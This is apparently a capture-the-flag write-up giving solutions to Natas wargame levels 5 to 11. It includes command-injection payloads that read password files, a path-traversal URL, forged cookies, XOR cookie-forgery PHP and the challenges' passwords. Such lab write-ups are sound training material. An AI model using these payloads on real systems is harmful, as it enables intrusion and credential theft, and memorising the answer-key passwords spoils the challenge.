# NatasChallenge
This is the solution to all Natas levels

### Level 5 [(http://natas5.natas.labs.overthewire.org/)](http://natas5.natas.labs.overthewire.org/)
```
1.Curl like this : curl http://natas5.natas.labs.overthewire.org/index.php -H "Authorization: Basic bmF0YXM1OlowTnNydElrSm9LQUxCQ0xpNWVxRmZjUk44MkF1Mm9E" -H "Cookie: loggedin=1"
2.You will get the natas6 password : fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
```

### Level 6 [(http://natas6.natas.labs.overthewire.org/)](http://natas6.natas.labs.overthewire.org/)
```
1.Curl like this : curl http://natas6.natas.labs.overthewire.org/includes/secret.inc -H "Authorization: Basic bmF0YXM2OmZPSXZFME1EdFBUZ1JocW1tdnZBT3QyRWZYUjZ1UWdS"
2.You will get secret : FOEIUWGHFEEUHOFUOIU
3.Submit the secret and you will get the natas 7 password : jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
```

### Level 7 [(http://natas7.natas.labs.overthewire.org/)](http://natas7.natas.labs.overthewire.org/)
```
1.Visit the page like this : http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../../..//etc/natas_webpass/natas8
2.You will get the natas8 password : a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB 
```

### Level 8 [(http://natas8.natas.labs.overthewire.org/)](http://natas8.natas.labs.overthewire.org/)
1.Read the source code and reverse the process
```
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
$result =  base64_decode(strrev(hex2bin($encodedSecret)));
echo $result;
```
2.You will get the "oubWYf2kBq" submit this secret and you will get the password of natas9 : Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd

### Level 9 [(http://natas9.natas.labs.overthewire.org/)](http://natas9.natas.labs.overthewire.org/)
```
1.Source code has command injection vulnerability
2.Use this payload : "t; cat /etc/natas_webpass/natas10" to grab the password
3.You will get the password of nata10 : D44EcsFkLxPIkAAKLosx8z3hxX1Z4
```

### Level 10 [(http://natas10.natas.labs.overthewire.org/)](http://natas10.natas.labs.overthewire.org/)
```
1.Use this payload to bypass filters : "-v  test /etc/natas_webpass/natas11" or "-r . /etc/natas_webpass/* #"
2.You will get the password of natas11 : 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
```

### Level 11 [(http://natas11.natas.labs.overthewire.org/)](http://natas11.natas.labs.overthewire.org/)
```
Rule1 : key XOR cleartext = ciphertext
Rule2 : ciphertext XOR cleartext = key
we have ciphertext (cookie)
we get cleartext (step 3)
we generate key (step 4)
```
1.Copy the value of cookie in the browser

2.URL decode and base64 decode the value of cookie taken from step 1 (online cyberchef)

3.Use an online PHP editor and run the following code to get the json encoded value of array :

```php
<?php
echo json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
?> 
```
4.XOR the value of step 2 with value of step 3 (online cyberchef)

5.you will get the key : KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK, the key is KNHL

6.Use this PHP code to generate a new cookie
```php
<?php
$mydata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = 'KNHL';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
$result = base64_encode(xor_encrypt(json_encode($mydata)));
echo $result;
?>
```
7.Replace the generated value of step 6 into cookie storage of the browser and refresh

8.You will get the password of natas12 : YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG

### Level 12 [(http://natas12.natas.labs.overthewire.org/)](http://natas12.natas.labs.overthewire.org/)
```

```
